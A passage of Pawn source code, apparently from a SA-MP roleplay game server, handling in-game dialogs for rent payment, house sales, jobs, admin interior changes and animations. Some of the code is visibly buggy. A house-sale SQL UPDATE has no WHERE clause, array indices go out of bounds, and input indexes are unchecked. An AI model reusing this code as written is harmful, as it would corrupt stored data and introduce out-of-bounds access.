            mysql_function_query(DATABASE,QUERY,false,"","");

			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
		}
		case 9522:
		{
		    if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			if(!HGet(playerid))
			{
			    SCM(playerid,COLOR_GREY," У вас отсутствует частное имущество");
			    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			switch(listitem)
			{
			case 0: SetPVarInt(playerid,"Housemoney",1);
			case 1: SetPVarInt(playerid,"Housemoney",3);
			case 2: SetPVarInt(playerid,"Housemoney",5);
			case 3: SetPVarInt(playerid,"Housemoney",12);
			case 4: SetPVarInt(playerid,"Housemoney",24);
			case 5: SetPVarInt(playerid,"Housemoney",72);
			case 6: SetPVarInt(playerid,"Housemoney",168);
			case 7: SetPVarInt(playerid,"Housemoney",336);
			case 8: SetPVarInt(playerid,"Housemoney",672);
			}
			new moneys = (GetPVarInt(playerid,"Housemoney")*GetHouseOplata(PlayerInfo[playerid][pPHouseKey]));
			if(PlayerInfo[playerid][pBank] < moneys)
			{
			    SCM(playerid,COLOR_GREY," Недостаточно средств на банковском счету");
			    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]+moneys > GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672+1) {
			SendMes(playerid,COLOR_GREY," Вы не можете пополнить домашний счет выше, чем на %i вирт. Ваш баланс: %i вирт",GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672,HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]);
			format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[1] 7 дней\t\t\t\t\t%i вирт\n[1] 14 дней\t\t\t\t\t%i вирт\n[1] 28 дней\t\t\t\t\t%i вирт",
			GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
			ShowPlayerDialogEx(playerid,9522,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату банком | {AE433D}Банкомат",string, "Выбрать", "Назад"); return true;}
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]+=moneys;
			PlayerInfo[playerid][pBank]-= moneys;
			FracBank[0][fKazna]+=moneys/2;
			SendMes(playerid,COLOR_BLUE," Вы перевели банком %i вирт. Остаток: %i вирт. Домашний счёт %i вирт",moneys,PlayerInfo[playerid][pBank],HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]);
			format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[6] 7 дней\t\t\t\t\t%i вирт\n[7] 14 дней\t\t\t\t\t%i вирт\n[8] 28 дней\t\t\t\t\t%i вирт",
			GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
			ShowPlayerDialogEx(playerid,9522,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату банком | {AE433D}Банкомат",string, "Выбрать", "Назад");
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			DeletePVar(playerid,"Housemoney");
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_HOUSE"` SET hTakings = '%i' WHERE hID = '%d'", HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings], playerid);
            mysql_function_query(DATABASE,QUERY,false,"","");

			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i' WHERE name = '%e'", PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 5032:
		{
			new house = PlayerInfo[playerid][pPHouseKey];
			if(!response) return true;
			if(!HGet(playerid)) return SCM(playerid,COLOR_GREY," У вас нет дома");
			if(house_car[playerid] != -1)
			{
				DestroyVehicle(house_car[playerid]);
				house_car[playerid] = -1;
			}
			HouseInfo[house][hHel] = 0;
			HouseInfo[house][hLock] = 1;
			HouseInfo[house][hVec] = 0;
			HouseInfo[house][hVcol1] = -1;
			HouseInfo[house][hVcol2] = -1;
			if(HouseInfo[house][hKlass] >= 2)
			{
				SetPVarInt(playerid,"chosencar",0); // Поставим значение "все автомобили в гараже и никакая машина не выбрана"
				DestroyVehicle(garage_car[playerid][0]);
				DestroyVehicle(garage_car[playerid][1]);
				DestroyVehicle(garage_car[playerid][2]);
				DestroyVehicle(garage_car[playerid][3]);
				DestroyVehicle(garage_car[playerid][4]);
			}
			for(new h = 0; h < 10; h++) HouseInfo[house][hSafe][h] = 0;
			strmid(HouseInfo[house][hOwner], "None", 0, strlen("None"), 15);
			PlayerInfo[playerid][pBank] += HouseInfo[house][hValue];
			format(string,40,"~w~house in sold~n~~g~$%i",HouseInfo[house][hValue]);
			GameTextForPlayer(playerid,string, 5000, 3);
			PlayerInfo[playerid][pPHouseKey] = 9999;
			SpawnChange[playerid] = 0;
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerPos(playerid,HouseInfo[house][hEntrancex],HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]);
			
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_HOUSE"` SET hOwner = '%e', hHel = '%i', hLock = '%i', hVec = '%i', hVcol1 = '%i', hVcol2 = '%i', hSafes = '%i,%i,%i,%i,%i,%i,%i,%i,%i,%i'",
            HouseInfo[house][hOwner],
			HouseInfo[house][hHel],
			HouseInfo[house][hLock],
			HouseInfo[house][hVec],
			HouseInfo[house][hVcol1],
			HouseInfo[house][hVcol2],
			HouseInfo[house][hSafe][0],
			HouseInfo[house][hSafe][1],
			HouseInfo[house][hSafe][2],
			HouseInfo[house][hSafe][3],
			HouseInfo[house][hSafe][4],
			HouseInfo[house][hSafe][5],
			HouseInfo[house][hSafe][6],
			HouseInfo[house][hSafe][7],
			HouseInfo[house][hSafe][8],
			HouseInfo[house][hSafe][9],
			HouseInfo[house][hSafe][10]);
			mysql_function_query(DATABASE,QUERY,false,"","");

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i', pPHouseKey = '%i', pSpawnChange = '%i,%i' WHERE name = '%e'", PlayerInfo[playerid][pBank], PlayerInfo[playerid][pPHouseKey], PlayerInfo[playerid][pSpawnChange][0], PlayerInfo[playerid][pSpawnChange][1], PlayerInfo[playerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
	case 4423:
		{
			if(response)
			{
				if(PlayerInfo[playerid][pMember] != 0 || GetPVarInt(playerid,"farm_id")) return SCM(playerid,COLOR_GRAD1, "Вы состоите во фракции");
				if(PlayerInfo[playerid][pJob] == 9)
				{
					if(Prorab[playerid] == true) SCM(playerid,COLOR_GREY," Вы уже начали рабочий день");
					SetPlayerSkin(playerid,27);
					SCM(playerid,COLOR_GREEN, "Рабочий день начат. (( На радаре помечены места загрузки и разгрузки ))");
					Prorab[playerid] = true;
				}
				else
				{
					if(Works[playerid] == true) return SCM(playerid,COLOR_GRAD1, " Вы уже начали рабочий день");
					Works[playerid] = true; JobAmmount[playerid] = 0; JobCP[playerid] = 1;
					SetPlayerCheckpoint(playerid,2230.3528,-2286.1353,14.3751,1.5);
					new skin = random(2);
					if(skin == 1) SetPlayerSkin(playerid,260);
					else SetPlayerSkin(playerid,16);
					SCM(playerid,COLOR_GREEN, "Рабочий день начат. (( На радаре помечены места загрузки и разгрузки ))");
					PicCP[playerid] = 0;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pJob] == 9)
				{
					if(Prorab[playerid] == false) return SCM(playerid,COLOR_GREY," Вы не начинали рабочий день");
					SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
					Prorab[playerid] = false;
					SCM(playerid,COLOR_GREEN, "Рабочий день окончен");
				}
				else
				{
					if(Works[playerid] == false) return SCM(playerid,COLOR_GRAD1, " Вы не начинали рабочий день");
					if(JobAmmount[playerid] != 0) return SCM(playerid,-1, " Вы должны получить зарплату в офисе");
					SCM(playerid,COLOR_GREEN, "Рабочий день окончен.");
					SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
					DisablePlayerCheckpoint(playerid);
					PicCP[playerid] = 1;
					mesh[playerid] = 999;
					usemesh[playerid] = 0;
					Works[playerid] = false;
					return true;
				}
			}
		}
	case 19:
		{
			if(response)
			{
				if(PlayerInfo[playerid][pMember] != 0) return SCM(playerid,COLOR_GRAD1, "Вы состоите во фракции");
				SetPlayerSkin(playerid,27);
				SCM(playerid,COLOR_GREEN, "Рабочий день начат. (( На радаре помечены места загрузки и разгрузки ))");
			}
			else
			{
				if(PlayerInfo[playerid][pJob] == 0) return SCM(playerid,COLOR_GRAD1, " Вы не брали работу");
				SCM(playerid,COLOR_YELLOW, "Рабочий день завершён");
				SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
				SCM(playerid,COLOR_GREEN,"Спасибо за работу, приходите еще!");
				return true;
			}
		}
	case 9298:
		{
			if(!response) return true;
			switch(PlayerInfo[playerid][pMember])
			{
			case 5:
				{
					if(MafiaBank[0][nLcn] < 500000) return SCM(playerid,COLOR_GREY," В банке мафии нет столько денег");
					lcnmats = 100000;
					SCM(playerid,COLOR_YELLOW, "Вы купили 100000 материалов за 500000 вирт");
					MafiaBank[0][nLcn]-=500000;
				}
			case 6:
				{
					if(MafiaBank[0][nYakuza] < 500000) return SCM(playerid,COLOR_GREY," В банке мафии нет столько денег");
					yakuzamats = 100000;
					SCM(playerid,COLOR_YELLOW, "Вы купили 100000 материалов за 500000 вирт");
					MafiaBank[0][nYakuza]-=500000;
				}
			case 14:
				{
					if(MafiaBank[0][nRm] < 500000) return SCM(playerid,COLOR_GREY," В банке мафии нет столько денег");
					rmmats = 100000;
					SCM(playerid,COLOR_YELLOW, "Вы купили 100000 материалов за 500000 вирт");
					MafiaBank[0][nRm]-=500000;
				}
			}
			return true;
		}
	case 7724:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					SetPlayerFacingAngle(playerid, 181.6046);
					SetPlayerCameraPos(playerid,338.6618,1573.9758,29.3534);
					SetPlayerCameraLookAt(playerid,338.6618,1573.9758,29.3534);
					TogglePlayerControllable(playerid, 0);
					return true;
				}
			case 1:
				{
					SetPlayerFacingAngle(playerid, 170.0947);
					SetPlayerCameraPos(playerid,-61.5420,1612.7935,24.2544);
					SetPlayerCameraLookAt(playerid,-61.5420,1612.7935,24.2544);
					TogglePlayerControllable(playerid, 0);
					return true;
				}
			case 2:
				{
					SetPlayerFacingAngle(playerid, 115.7203);
					SetPlayerCameraPos(playerid,121.2786,1942.5219,29.0367);
					SetPlayerCameraLookAt(playerid,121.2786,1942.5219,29.0367);
					TogglePlayerControllable(playerid, 0);
					return true;
				}
			case 3:
				{
					SetPlayerFacingAngle(playerid, 319.3263);
					SetPlayerCameraPos(playerid,277.4582,2024.3215,26.3999);
					SetPlayerCameraLookAt(playerid,277.4582,2024.3215,26.3999);
					TogglePlayerControllable(playerid, 0);
					return true;
				}
			}
			SCM(playerid, COLOR_LIGHTRED, "/cameraoff - отключить камеру.");
			SetPlayerVirtualWorld(playerid, 0);
		}
	case 3725:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					for(new h = 1; h <= TotalHouse; h++)
					{
						if(strcmp(HouseInfo[h][hOwner],"None",true) != 0)
						{
							SCM(playerid, COLOR_GRAD1, " Все дома проданы");
							strmid(HouseInfo[h][hOwner], "None", 0, strlen("None"), 15);
							BuyHouse(h);
						}
					}
					return true;
				}
			case 1:
				{
					for(new i = 1; i <= TotalBizz; i++)
					{
						if(strcmp(BizzInfo[i][bOwner],"None",true) != 0)
						{
							SCM(playerid, COLOR_GRAD1, " Все бизнесы проданы");
							strmid(BizzInfo[i][bOwner], "None", 0, strlen("None"), 15);
							BizzInfo[i][bTill] = 0;
							BizzInfo[i][bPrice] = 0;
							BizzInfo[i][bMafia] = 0;
							BizzInfo[i][bLandTax] = 0;
							BizzPay[i] = 0;
							format(string, 90, "%s\nПродаётся", BizzInfo[i][bMessage],BizzInfo[i][bBuyPrice]);
							UpdateDynamic3DTextLabelText(BizzInfo[i][bLabel], COLOR_GREEN, string);
						}
					}
				}
			case 2:
				{
					ShowPlayerDialogEx(playerid, 2725, DIALOG_STYLE_LIST, "Выбирете интерьер", " [1] Деревянный\n [2] Мрамор\n [3] Дворец\n [4] Обычный стиль\n [5] Обычное дерево\n [6] Обычный стиль 2\n [7] Красное деверо\n [8] Обычный стиль\n [9] Дешовый стиль", "Выбрать", "Закрыть");
					return true;
				}
			case 3:
				{
					ShowPlayerDialogEx(playerid, 15624, DIALOG_STYLE_LIST, "Выбирете интерьер", " [1] Интерьер C Класса\n [2] Интерьер A Класса\n [3] Интерьер S Класса\n [4] Интерьер D Класса\n [5] Интерьер D Класса\n [6] Интерьер N Класса\n [7] Интерьер S Класса\n [8] Интерьер D Класса\n [9] Интерьер D Класса\n [10] Интерьер D Класса\n [11] Интерьер A Класса\n [12] Интерьер N Класса\n [13] Интерьер S Класса", "Выбрать", "Закрыть");
					return true;
				}
			case 4:
				{
					for(new h = 1; h <= TotalHouse; h++)
					{
						if(HouseInfo[h][hInt] == 10) HouseInfo[h][hKlass] = 0;
						else if(HouseInfo[h][hInt] == 6) HouseInfo[h][hKlass] = 1;
						else if(HouseInfo[h][hInt] == 5) HouseInfo[h][hKlass] = 2;
						else if(HouseInfo[h][hInt] == 12) HouseInfo[h][hKlass] = 3;
						else if(HouseInfo[h][hKlass] == 4) HouseInfo[h][hKlass] = 4;
						SendMes(playerid,-1," Дом %i распеределен",h);
					}
				}
			case 5:
				{
					for(new h = 1; h <= TotalHouse; h++)
					{
						if(HouseInfo[h][hKlass] == 0) HouseInfo[h][hValue] = 130000;
						if(HouseInfo[h][hKlass] == 1) HouseInfo[h][hValue] = 350000;
						if(HouseInfo[h][hKlass] == 2) HouseInfo[h][hValue] = 1500000;
						if(HouseInfo[h][hKlass] == 3) HouseInfo[h][hValue] = 2500000;
						if(HouseInfo[h][hKlass] == 4) HouseInfo[h][hValue] = 16000000;
						if(HouseInfo[h][hKlass] == 5) HouseInfo[h][hValue] = 30000000;
						SendMes(playerid,-1," Дом %i распеределен",h);
					}
				}
			}
		}
	case 2725:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:	ShowPlayerDialogEx(playerid, 2726, DIALOG_STYLE_INPUT, "Деревянный стиль", "Введите номер дома", "Готово", "Отмена");
			case 1:	ShowPlayerDialogEx(playerid, 2727, DIALOG_STYLE_INPUT, "Мрамор", "Введите номер дома", "Готово", "Отмена");
			case 2: ShowPlayerDialogEx(playerid, 2728, DIALOG_STYLE_INPUT, "Дворец", "Введите номер дома", "Готово", "Отмена");
			case 3:	ShowPlayerDialogEx(playerid, 2729, DIALOG_STYLE_INPUT, "Обычный стиль", "Введите номер дома", "Готово", "Отмена");
			case 4:	ShowPlayerDialogEx(playerid, 2730, DIALOG_STYLE_INPUT, "Обычное дерево", "Введите номер дома", "Готово", "Отмена");
			case 5: ShowPlayerDialogEx(playerid, 2731, DIALOG_STYLE_INPUT, "Обычный стиль [2]", "Введите номер дома", "Готово", "Отмена");
			case 6:	ShowPlayerDialogEx(playerid, 2732, DIALOG_STYLE_INPUT, "Красное дерево", "Введите номер дома", "Готово", "Отмена");
			case 7: ShowPlayerDialogEx(playerid, 2733, DIALOG_STYLE_INPUT, "Обычный стиль [3]", "Введите номер дома", "Готово", "Отмена");
			case 8: ShowPlayerDialogEx(playerid, 2734, DIALOG_STYLE_INPUT, "Дешевый стиль", "Введите номер дома", "Готово", "Отмена");
			}
		}
	case 15624:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: ShowPlayerDialogEx(playerid, 2735, DIALOG_STYLE_INPUT, "Интерьер C Класса", "Введите номер дома", "Готово", "Отмена");
			case 1: ShowPlayerDialogEx(playerid, 2736, DIALOG_STYLE_INPUT, "Интерьер A Класса", "Введите номер дома", "Готово", "Отмена");
			case 2: ShowPlayerDialogEx(playerid, 2737, DIALOG_STYLE_INPUT, "Интерьер S Класса", "Введите номер дома", "Готово", "Отмена");
			case 3: ShowPlayerDialogEx(playerid, 2738, DIALOG_STYLE_INPUT, "Интерьер D Класса", "Введите номер дома", "Готово", "Отмена");
			case 4: ShowPlayerDialogEx(playerid, 2739, DIALOG_STYLE_INPUT, "Интерьер D Класса", "Введите номер дома", "Готово", "Отмена");
			case 5: ShowPlayerDialogEx(playerid, 2740, DIALOG_STYLE_INPUT, "Интерьер N Класса", "Введите номер дома", "Готово", "Отмена");
			case 6: ShowPlayerDialogEx(playerid, 2741, DIALOG_STYLE_INPUT, "Интерьер S Класса", "Введите номер дома", "Готово", "Отмена");
			case 7: ShowPlayerDialogEx(playerid, 2742, DIALOG_STYLE_INPUT, "Интерьер D Класса", "Введите номер дома", "Готово", "Отмена");
			case 8: ShowPlayerDialogEx(playerid, 2743, DIALOG_STYLE_INPUT, "Интерьер D Класса", "Введите номер дома", "Готово", "Отмена");
			case 9: ShowPlayerDialogEx(playerid, 2744, DIALOG_STYLE_INPUT, "Интерьер D Класса", "Введите номер дома", "Готово", "Отмена");
			case 10: ShowPlayerDialogEx(playerid, 2745, DIALOG_STYLE_INPUT, "Интерьер A Класса", "Введите номер дома", "Готово", "Отмена");
			case 11: ShowPlayerDialogEx(playerid, 2746, DIALOG_STYLE_INPUT, "Интерьер N Класса", "Введите номер дома", "Готово", "Отмена");
			case 12: ShowPlayerDialogEx(playerid, 2747, DIALOG_STYLE_INPUT, "Интерьер S Класса", "Введите номер дома", "Готово", "Отмена");
			}
		}
	case 2726:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 4;
			HouseInfo[house][hExitx] = -261.9759;
			HouseInfo[house][hExity] = 1456.8844;
			HouseInfo[house][hExitz] = 1084.3672;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
			return true;
		}
	case 2727:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 6;
			HouseInfo[house][hExitx] = 234.1571;
			HouseInfo[house][hExity] = 1064.9569;
			HouseInfo[house][hExitz] = 1084.2104;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2728:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 5;
			HouseInfo[house][hExitx] = 140.9131;
			HouseInfo[house][hExity] = 1367.9713;
			HouseInfo[house][hExitz] = 1083.8621;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2729:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 5;
			HouseInfo[house][hExitx] = 22.7783;
			HouseInfo[house][hExity] = 1404.9600;
			HouseInfo[house][hExitz] = 1084.4297;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2730:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 10;
			HouseInfo[house][hExitx] = 23.8334;
			HouseInfo[house][hExity] = 1340.4812;
			HouseInfo[house][hExitz] = 1084.3750;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2731:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 4;
			HouseInfo[house][hExitx] = 261.0654;
			HouseInfo[house][hExity] = 1284.2991;
			HouseInfo[house][hExitz] = 1080.2578;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2732:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 2;
			HouseInfo[house][hExitx] = 491.0190;
			HouseInfo[house][hExity] = 1399.0691;
			HouseInfo[house][hExitz] = 1080.2578;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2733:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 2;
			HouseInfo[house][hExitx] = 225.9761;
			HouseInfo[house][hExity] = 1239.9126;
			HouseInfo[house][hExitz] = 1082.1406;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2734:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 10;
			HouseInfo[house][hExitx] = 2261.3103;
			HouseInfo[house][hExity] = -1136.4467;
			HouseInfo[house][hExitz] = 1050.6328;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2735:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 5;
			HouseInfo[house][hExitx] = 22.7405;
			HouseInfo[house][hExity] = 1404.3799;
			HouseInfo[house][hExitz] = 1084.4297;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2736:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 5;
			HouseInfo[house][hExitx] = 140.2206;
			HouseInfo[house][hExity] = 1367.2734;
			HouseInfo[house][hExitz] = 1083.8612;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2737:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 6;
			HouseInfo[house][hExitx] = 234.1562;
			HouseInfo[house][hExity] = 1064.9047;
			HouseInfo[house][hExitz] = 1084.2106;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2738:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 6;
			HouseInfo[house][hExitx] = -68.8618;
			HouseInfo[house][hExity] = 1352.2183;
			HouseInfo[house][hExitz] = 1080.2109;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2739:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 8;
			HouseInfo[house][hExitx] = -42.6081;
			HouseInfo[house][hExity] = 1406.5001;
			HouseInfo[house][hExitz] = 1084.4297;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2740:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 6;
			HouseInfo[house][hExitx] = 344.7035;
			HouseInfo[house][hExity] = 304.9266;
			HouseInfo[house][hExitz] = 999.1484;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2741:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 5;
			HouseInfo[house][hExitx] = 1298.9363;
			HouseInfo[house][hExity] = -795.4872;
			HouseInfo[house][hExitz] = 1084.0078;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2742:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 2;
			HouseInfo[house][hExitx] = 2467.7708;
			HouseInfo[house][hExity] = -1698.2811;
			HouseInfo[house][hExitz] = 1013.5078;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2743:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 8;
			HouseInfo[house][hExitx] = 2807.6252;
			HouseInfo[house][hExity] = -1173.2600;
			HouseInfo[house][hExitz] = 1025.5703;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2744:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 5;
			HouseInfo[house][hExitx] = 318.6064;
			HouseInfo[house][hExity] = 1115.7708;
			HouseInfo[house][hExitz] = 1083.8828;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2745:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 12;
			HouseInfo[house][hExitx] = 2324.3367;
			HouseInfo[house][hExity] = -1148.6296;
			HouseInfo[house][hExitz] = 1050.7101;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2746:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 10;
			HouseInfo[house][hExitx] = 421.7613;
			HouseInfo[house][hExity] = 2536.4836;
			HouseInfo[house][hExitz] = 10.0000;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 2747:
		{
			if(!response) return true;
			new house = strval(inputtext);
			HouseInfo[house][hInt] = 7;
			HouseInfo[house][hExitx] = 225.631;
			HouseInfo[house][hExity] = 1022.48;
			HouseInfo[house][hExitz] = 1084.07;
			SCM(playerid, COLOR_GREEN, " Интеръер дома изменен");
		}
	case 1994:
		{
			if(!response) return true;
			ClearAnimations(playerid);
			switch(listitem)
			{
			case 0: ApplyAnimation(playerid, "DANCING", "dnce_M_b", 4.1, 1, 0, 0, 1, 1 , 1);
			case 1: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE1);
			case 2: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE2);
			case 3: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE3);
			case 4: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE4);
			case 5: ApplyAnimation(playerid, "SMOKING", "M_smklean_loop", 4.1, 1, 0, 0, 1, 1, 1);
			case 6: ApplyAnimation(playerid, "SUNBATHE", "ParkSit_M_in", 4.1, 0, 0, 0, 1, 1, 1);
			case 7: ApplyAnimation(playerid, "SUNBATHE", "SitnWait_in_W", 4.1, 0, 0, 0, 1, 1, 1);
			case 8: ApplyAnimation(playerid, "CRACK", "Bbalbat_Idle_01", 4.1, 0, 0, 0, 1, 1, 1);
			case 9: ApplyAnimation(playerid, "CRACK", "crckdeth1", 4.1, 0, 0, 0, 1, 1, 1);
			case 10: ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.1, 0, 0, 0, 1, 1, 1);
			case 11: ApplyAnimation(playerid, "CRACK", "crckdeth3", 4.1, 0, 0, 0, 1, 1, 1);
			case 12: ApplyAnimation(playerid, "CRACK", "crckdeth4", 4.1, 0, 0, 0, 1, 1, 1);
			case 13: ApplyAnimation(playerid, "CRACK", "crckidle1", 4.1, 0, 0, 0, 1, 1, 1);
			case 14: ApplyAnimation(playerid, "CRACK", "crckidle2", 4.1, 0, 0, 0, 1, 1, 1);
			case 15: ApplyAnimation(playerid, "CRACK", "crckidle3", 4.1, 0, 0, 0, 1, 1, 1);
			case 16: ApplyAnimation(playerid, "CRACK", "crckidle4", 4.1, 0, 0, 0, 1, 1, 1);
			case 17: ApplyAnimation(playerid, "DEALER", "DEALER_IDLE", 4.1, 0, 0, 0, 1, 1, 1);
			case 18: ApplyAnimation(playerid, "PED", "gang_gunstand", 4.1, 0, 0, 0, 1, 1, 1);
			case 19: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_HANDSUP);
			case 20: ApplyAnimation(playerid, "PED", "DUCK_cower", 4.1, 0, 0, 0, 1, 1, 1);
